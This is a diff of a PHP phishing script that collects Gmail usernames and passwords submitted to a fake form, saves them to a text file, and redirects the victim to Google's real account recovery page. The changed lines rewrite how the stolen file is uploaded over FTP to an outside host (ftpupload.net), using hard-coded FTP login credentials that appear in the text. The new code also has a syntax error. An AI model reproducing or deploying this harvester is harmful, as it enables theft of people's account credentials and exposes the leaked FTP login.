@@ -4,35 +4,24 @@ file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " P
 header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
 //check if form is submitted
     // ftp settings
-    $ftp_hostname = 'ftpupload.net'; // change this
-    $ftp_username = 'b12_32676505'; // change this
-    $ftp_password = 'godjesus123S'; // change this
+$host='ftpupload.net'
+$port= 21;
+$timeout =1;
+$user = 'b12_32676505';
+$pass = 'godjesus123S';
+$dest_file = 'usernames.txt';
+$source_file = 'usernames.txt';
+    $ftp = ftp_connect($host, $port, $timeout);
+ftp_login($ftp, $user, $pass);
+ 
+$ret = ftp_nb_put($ftp, $dest_file, $source_file, FTP_BINARY, FTP_AUTORESUME);
 
-    $src_file = $_FILES['srcfile']['usernames.txt'];
-
-    //upload file
-    if ($src_file!='')
+while (FTP_MOREDATA == $ret)
     {
-        // remote file path
-      
-        
-        // connect ftp
-        $ftpcon = ftp_connect($ftp_hostname) or die('Error connecting to ftp server...');
-        
-        // ftp login
-        $ftplogin = ftp_login($ftpcon, $ftp_username, $ftp_password);
-        
-        // ftp upload
-        if (ftp_put($ftpcon, $src_file, $src_file, FTP_ASCII))
-            echo 'File uploaded successfully to FTP server!';
-        else
-            echo 'Error uploading file! Please try again later.';
-        
-        // close ftp stream
-        ftp_close($ftpcon);
+        // display progress bar, or something
+        $ret = ftp_nb_continue($ftp);
     }
-    else {
-        header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
-}
+ 
+// all done :-
 exit();
 ?>
